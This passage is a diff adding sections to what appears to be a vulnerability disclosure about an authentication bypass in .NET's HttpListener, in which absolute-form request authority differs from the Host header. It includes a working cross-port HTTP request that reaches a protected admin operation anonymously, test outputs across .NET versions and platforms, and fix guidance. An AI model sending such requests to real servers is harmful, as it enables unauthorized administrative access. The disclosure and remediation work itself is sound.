@@ -604,3 +604,113 @@ an application credential-validation stage that wrong credentials fail and corre
 
 The proof remains deliberately synthetic: the protected operation creates only a marker in the runner's temporary
 directory.
+
+
+## Causal current-main fix proof — hostname authority
+
+Clean current-main run:
+
+https://github.com/SamCloudJourney/basic-website/actions/runs/35530783238
+
+Validated source commit:
+
+`12921b1d8c6865a774232de9379133020ad23d79`
+
+Unpatched source:
+
+```text
+CURRENT_MAIN_AUTHORITY_CONFUSION=CONFIRMED
+CURRENT_MAIN_PUBLIC_CONTROL=PASS
+CURRENT_MAIN_ADMIN_BASIC_CONTROL=PASS
+CURRENT_MAIN_AUTH_SCHEME_FULL_WIRE_BYPASS=CONFIRMED
+```
+
+A minimal managed-source experiment canonicalizes the Host-facing value to the absolute-form authority and rebuilds the
+actual `System.Net.HttpListener` product assembly before rerunning the same security regression.
+
+Patched-source result:
+
+```text
+EXPERIMENTAL_GUARD_PUBLIC_CONTROL=PASS
+EXPERIMENTAL_GUARD_ADMIN_CONTROL=PASS
+EXPERIMENTAL_GUARD_SELECTOR UserHostName=admin.test:<port> Url.Host=admin.test Selected=Basic
+EXPERIMENTAL_AUTHORITY_CANONICALIZATION_GUARD=BLOCKS_BYPASS
+```
+
+So the hostname-authority bypass is causally removed while both public and admin controls remain unchanged.
+
+## Cross-port authority variant — affects Windows/http.sys too
+
+A second, stronger sibling variant uses the **same hostname on two ports**:
+
+```text
+PUBLIC listener: http://app.test:<publicPort>/public/
+ADMIN listener:  http://app.test:<adminPort>/admin/
+```
+
+The attacker connects directly to the ADMIN port but sends an absolute-form target naming the PUBLIC port:
+
+```http
+POST http://app.test:<publicPort>/admin/change HTTP/1.1
+Host: app.test:<publicPort>
+Content-Length: 0
+Connection: close
+```
+
+HttpListener exposes:
+
+```text
+UserHostName / Host-facing authority = app.test:<publicPort>
+Request.Url.Authority               = app.test:<adminPort>
+```
+
+The admin listener's selector therefore selects Anonymous from the public port while framework routing remains bound to
+the admin socket/listener. The protected admin operation executes and creates the synthetic side effect.
+
+Clean cross-platform run:
+
+https://github.com/SamCloudJourney/basic-website/actions/runs/35532123773
+
+Confirmed:
+
+- .NET 8.0.31 Linux
+- .NET 8.0.31 Windows/http.sys
+- .NET 9.0.20 Linux
+- .NET 9.0.20 Windows/http.sys
+- .NET 10.0.12 Linux
+- .NET 10.0.12 macOS
+- .NET 10.0.12 Windows/http.sys
+- .NET 11.0.0-rc.1 Linux
+- .NET 11.0.0-rc.1 macOS
+- .NET 11.0.0-rc.1 Windows/http.sys
+
+Representative Windows .NET 10 result:
+
+```text
+ADMIN_CONTROL:
+  UserHostName=app.test:<adminPort>
+  UrlAuthority=app.test:<adminPort>
+  Selected=Basic
+  401 Unauthorized
+  sideEffect=False
+
+ABSOLUTE_PUBLIC_PORT_TO_ADMIN_SOCKET:
+  connectPort=<adminPort>
+  UserHostName=app.test:<publicPort>
+  UrlAuthority=app.test:<adminPort>
+  Selected=Anonymous
+  200 OK
+  adminContext=True
+  sideEffect=True
+
+CROSS_PORT_FRAMEWORK_AUTH_BYPASS=CONFIRMED
+```
+
+This broadens the root cause from a managed-only hostname discrepancy to a more general **absolute-form authority
+inconsistency**: host and port components can be sourced from different places, and the port variant reproduces on
+Windows/http.sys as well.
+
+Important remediation implication: the three-line managed Host canonicalization experiment closes the hostname variant,
+but a complete product fix must canonicalize the **entire authority (host + port)** consistently for request properties,
+listener/resource routing, and authentication selection, or reject inconsistent absolute-form authority when it cannot
+be represented consistently.
